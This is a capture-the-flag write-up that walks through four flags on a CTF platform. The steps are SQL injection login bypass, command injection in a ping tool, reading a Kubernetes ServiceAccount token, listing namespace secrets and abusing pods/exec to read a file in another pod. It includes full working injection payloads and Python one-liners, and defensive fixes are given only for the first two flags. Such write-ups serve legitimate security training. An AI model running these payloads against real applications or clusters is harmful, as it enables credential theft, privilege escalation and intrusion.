## Flag 1

- **Token**: `eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjEiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiOGJlYWQ1YzktN2Q2Mi00OTFhLWJkOWItYmVjZDI3ZWFjMWU4In0.4BlQcPKpb1d7xonek7uVzhTxhp9Juw8Vrug_2y1_iRAJzVKOki-afAX_WjHtDYApyBxASa7JmHiyDN1uYnhWDg`

- **Discovery Path**:

    1. Accessed the login page at `https://play.thndr-ctf.app/`.

    2. Tested for basic SQL injection in the `username` field using `' OR 1=1 --`.

    3. Successfully bypassed the login and was redirected to `/dashboard`.

    4. Flag 1 was displayed as the "Operator token" on the dashboard.

- **Defensive Fix**: Use parameterized queries or an ORM to prevent SQL injection. Implement proper input validation and sanitization.

  

---
## Flag 2

- **Token**: `eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjIiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiZmQ5YjdmYTQtYmY0OS00OTY5LWExNzAtNWQ5OWQ5YWNmYjA3In0.EtLbs3i7wxP3VDNXPWcHbu_JoxUcQzyJJNpk7g_DuMU3LPkQ4iit-buRCwF6gPPs9Ozjcsx1HFW8lkZdzp30Bg`

- **Discovery Path**:

    1. Identified a "Connectivity diagnostics" tool on the dashboard that performs a `ping`.

    2. Tested for command injection by appending `; ls -la` to the input.

    3. The command executed successfully, revealing a file named `flag2.jwt` in the current directory.

    4. Used `127.0.0.1; cat flag2.jwt` to read the file content.

- **Defensive Fix**: Avoid using shell commands directly. If necessary, use a well-defined API or library for the specific task (e.g., a native ping library) and strictly validate/sanitize all user inputs. Use a whitelist of allowed characters.

  

---
# Kubernetes Exploitation Report – Flag 3 Extraction

## Objective

The objective was to exploit the vulnerable application, gain access to the Kubernetes environment, and extract Flag 3 from the cluster.

---

# 1. Initial Vulnerability Discovery

The application was vulnerable to **OS Command Injection** through user input.

## Payload Used

```
127.0.0.1; ls
```

### Explanation

The application executed a system command similar to:

```
ping <user_input>
```

By injecting `;`, it became:

```
ping 127.0.0.1; ls
```

This allowed arbitrary command execution on the server and confirmed Remote Code Execution (RCE).

---

# 2. Environment Enumeration

After obtaining RCE, environment variables were inspected.

## Command

```
127.0.0.1; env
```

### Important Findings

```
KUBERNETES_SERVICE_HOST=172.20.0.1POD_B_SERVICE_HOST=172.20.82.56HOSTNAME=pod-a-7df599db96-n57w7
```

### Analysis

These variables confirmed that the application was running inside a Kubernetes cluster.

---

# 3. Kubernetes ServiceAccount Discovery

The default Kubernetes secrets directory was inspected.

## Command

```
127.0.0.1; ls -lah /var/run/secrets/kubernetes.io/serviceaccount
```

### Files Found

```
tokennamespaceca.crt
```

### Analysis

The presence of these files confirmed that the pod had a mounted Kubernetes ServiceAccount.

---

# 4. Reading the ServiceAccount Token

## Command

```
127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Analysis

The token is used by Kubernetes pods to authenticate against the Kubernetes API Server.

---

# 5. Accessing the Kubernetes API

The token was used to communicate directly with the Kubernetes API.

## Command

```
127.0.0.1; python3 -c "import ssl,urllib.request; t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read(); req=urllib.request.Request('https://kubernetes.default.svc/api',headers={'Authorization':'Bearer '+t}); print(urllib.request.urlopen(req,context=ssl._create_unverified_context()).read().decode())"
```

### Result

```
{"kind":"APIVersions","versions":["v1"]}
```

### Analysis

This confirmed:

- Successful authentication
- Access to the internal Kubernetes API
- Valid ServiceAccount credentials

---

# 6. RBAC Restriction Discovery

An attempt was made to enumerate cluster resources.

## Command

```
/api/v1/pods
```

### Result

```
HTTP Error 403: Forbidden
```

### Analysis

The ServiceAccount had limited RBAC permissions and could not access cluster-wide resources.

---

# 7. Namespace Enumeration

The current namespace was identified.

## Command

```
127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### Result

```
c-www1aborashad-gmail-com
```

---

# 8. Exploiting Namespace-Level Permissions

Instead of requesting cluster-wide secrets, a namespace-scoped request was used.

## Command

```
127.0.0.1; python3 -c 'import urllib.request, ssl; ctx = ssl._create_unverified_context(); token = open("/run/secrets/kubernetes.io/serviceaccount/token").read(); req = urllib.request.Request("https://kubernetes.default.svc/api/v1/namespaces/c-www1aborashad-gmail-com/secrets", headers={"Authorization": f"Bearer {token}"}); print(urllib.request.urlopen(req, context=ctx).read().decode())'
```

### Analysis

This successfully bypassed the earlier restriction because the ServiceAccount had permissions to access secrets inside its own namespace.

---

# 9. Flag 3 Discovery

The Kubernetes API returned a secret named:

```
flag3
```

# Extracted Flag 3 JWT

```
eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjMiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiNTJjYjE2NmYtZmQzNi00OTA5LWJjNjgtMjE2MjFlY2JlMWUxIn0.4mRisWnd2XNu3D3Iz_423su7omtslDBAGFKdhj8TeKbG6jTSK4j_2W8MTMiJyhLFCE1QhQuXHFoYnQLYJ52vBQ
```



___
# flag 4> 
`eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjQiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiNGM4ZDAyOTktMjlkZS00ZWU5LThhNmEtYmRjYTUzYTgxNTdmIn0.OdOEFc_Hs9yX-9m6pxugD0p1Lxk-LnQ7qhposVlcpEfaouQeOXpNbhl3H5rHXufK1YfczEgNXKwSxF4YMQNxAA`

# Flag 4 – Kubernetes Privilege Escalation Report

## Overview

The target application was vulnerable to Command Injection, which allowed arbitrary command execution inside a Kubernetes pod.  
Through enumeration of the Kubernetes environment and abuse of the mounted ServiceAccount token, it was possible to access the Kubernetes API and escalate privileges using the `pods/exec` permission.

This led to remote command execution inside `pod-b` and extraction of the fourth flag stored in `/flag4.jwt`.

---

# Step 1 – Initial Command Injection

The vulnerability was confirmed using:

```bash
127.0.0.1; env
```

The output revealed Kubernetes-related environment variables:

```text
KUBERNETES_SERVICE_HOST
KUBERNETES_SERVICE_PORT
```

This indicated the application was running inside a Kubernetes cluster.

---

# Step 2 – Discovering ServiceAccount Credentials

The mounted Kubernetes ServiceAccount secrets were enumerated:

```bash
127.0.0.1; ls /var/run/secrets/kubernetes.io/serviceaccount
```

The ServiceAccount token was extracted:

```bash
127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

# Step 3 – Accessing the Kubernetes API

The token was used to authenticate against the internal Kubernetes API server:

```bash
127.0.0.1; python3 -c "import ssl,urllib.request; t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read(); req=urllib.request.Request('https://kubernetes.default.svc/api',headers={'Authorization':'Bearer '+t}); print(urllib.request.urlopen(req,context=ssl._create_unverified_context()).read().decode())"
```

Successful access confirmed the token was valid.

---

# Step 4 – Enumerating RBAC Permissions

The permissions assigned to the ServiceAccount were enumerated:

```bash
127.0.0.1; python3 -c "import ssl,urllib.request,json; t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read(); data=b'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{}}'; req=urllib.request.Request('https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',data=data,headers={'Authorization':'Bearer '+t,'Content-Type':'application/json'}); print(urllib.request.urlopen(req,context=ssl._create_unverified_context()).read().decode())"
```

The response revealed a dangerous permission:

```text
pods/exec
```

This permission allowed remote command execution inside other pods.

---

# Step 5 – Identifying Flag 4 Location

The specification of `pod-b` was retrieved:

```bash
127.0.0.1; python3 -c "import ssl,urllib.request; t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read(); ns=open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip(); req=urllib.request.Request(f'https://kubernetes.default.svc/api/v1/namespaces/{ns}/pods/pod-b',headers={'Authorization':'Bearer '+t}); print(urllib.request.urlopen(req,context=ssl._create_unverified_context()).read().decode())"
```

The pod configuration revealed:

```yaml
mountPath: /flag4.jwt
configMap: flag4
```

Thus, the fourth flag was stored at:

```text
/flag4.jwt
```

---

# Step 6 – Exploiting Kubernetes Remote Exec

A WebSocket connection was established to the Kubernetes Remote Exec API in order to execute:

```text
cat /flag4.jwt
```

Command used:

```bash
127.0.0.1; python3 -c "import ssl,socket,time; t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read(); ns=open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip(); req=f'GET /api/v1/namespaces/{ns}/pods/pod-b/exec?command=cat&command=/flag4.jwt&stdout=1&stderr=1 HTTP/1.1\r\nHost: kubernetes.default.svc\r\nAuthorization: Bearer {t}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: SGVsbG8=\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: v4.channel.k8s.io\r\n\r\n'; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; s=ctx.wrap_socket(socket.socket(),server_hostname='kubernetes.default.svc'); s.connect(('kubernetes.default.svc',443)); s.send(req.encode()); time.sleep(1); s.recv(4096); print(s.recv(4096))"
```

The response contained a WebSocket binary frame including the JWT flag.

---

# Step 7 – Extracted Flag 4

```text
eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjQiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiNGM4ZDAyOTktMjlkZS00ZWU5LThhNmEtYmRjYTUzYTgxNTdmIn0.OdOEFc_Hs9yX-9m6pxugD0p1Lxk-LnQ7qhposVlcpEfaouQeOXpNbhl3H5rHXufK1YfczEgNXKwSxF4YMQNxAA
```

---

# Vulnerability Classification

```text
- Command Injection
- Kubernetes ServiceAccount Abuse
- Kubernetes API Privilege Escalation
- Remote Pod Execution Abuse
```

